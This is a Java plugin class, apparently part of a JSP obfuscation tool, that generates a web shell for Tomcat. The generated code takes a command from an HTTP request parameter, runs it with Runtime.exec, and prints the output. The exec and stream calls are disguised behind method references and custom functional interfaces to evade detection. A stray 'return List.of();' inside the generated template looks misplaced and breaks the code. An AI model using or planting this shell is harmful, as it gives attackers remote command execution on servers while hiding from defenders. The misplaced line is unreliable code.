package com.t3stzer0.jspobfuscator.plugins.extensions.Gadget;

import com.t3stzer0.jspobfuscator.api.plugin.context.ExtensionContext;
import com.t3stzer0.jspobfuscator.api.plugin.exceptions.ExtensionException;
import com.t3stzer0.jspobfuscator.api.plugin.gadget.GadgetExtension;
import org.pf4j.Extension;

import java.util.List;

@Extension
public class MethodReference implements GadgetExtension {

  @Override
  public List<String> getCode(ExtensionContext ctx) {

    String cmdParameter = ctx.getStringInput("cmdParameter");
    if (cmdParameter == null || cmdParameter.isEmpty()) {
      throw new ExtensionException("Command parameter cannot be empty");
    }

    return List.of(
        String.format(
"""
 try {
     final javax.servlet.http.HttpServletRequest r = request;
     ExecFunction exec = Runtime.getRuntime()::exec;
     StreamFunction getStream = Process::getInputStream;
     ReaderCreator toReader = java.io.InputStreamReader::new;
     BufferedReaderCreator toBufferedReader = java.io.BufferedReader::new;
     ReadLineFunction readLine = java.io.BufferedReader::readLine;
     PrintFunction print = out::println;
     Process proc = exec.apply(r.getParameter("%s"));
     java.io.InputStream is = getStream.apply(proc);
return List.of();
      try (java.io.BufferedReader reader = toBufferedReader.apply(toReader.apply(is))) {
          String line;
          while ((line = readLine.apply(reader)) != null) {
              print.apply(line);
          }
      }
  } catch (Exception e){}
""",
            cmdParameter));
  }

  @Override
  public List<String> getDeclaration(ExtensionContext ctx) {
    return List.of(
        """
             @FunctionalInterface
            interface ExecFunction {
                Process apply(String cmd) throws Exception;
            }

            @FunctionalInterface
            interface StreamFunction {
                java.io.InputStream apply(Process p) throws Exception;
            }

            @FunctionalInterface
            interface ReaderCreator {
                java.io.InputStreamReader apply(java.io.InputStream is) throws Exception;
            }

            @FunctionalInterface
            interface BufferedReaderCreator {
                java.io.BufferedReader apply(java.io.Reader r) throws Exception;
            }

            @FunctionalInterface
            interface ReadLineFunction {
                String apply(java.io.BufferedReader reader) throws Exception;
            }

            @FunctionalInterface
            interface PrintFunction {
                void apply(String arg) throws Exception;
            }
            """);
  }

  @Override
  public List<String> getImports(ExtensionContext ctx) {
    return List.of();
  }

  @Override
  public void initExtension(ExtensionContext ctx) {
    ctx.registerStringInput("cmdParameter", true, "cmd");
  }

  @Override
  public String getHelp() {
    return "requires tomcat >= 9.0 or sourceVM >= 1.8";
  }
}
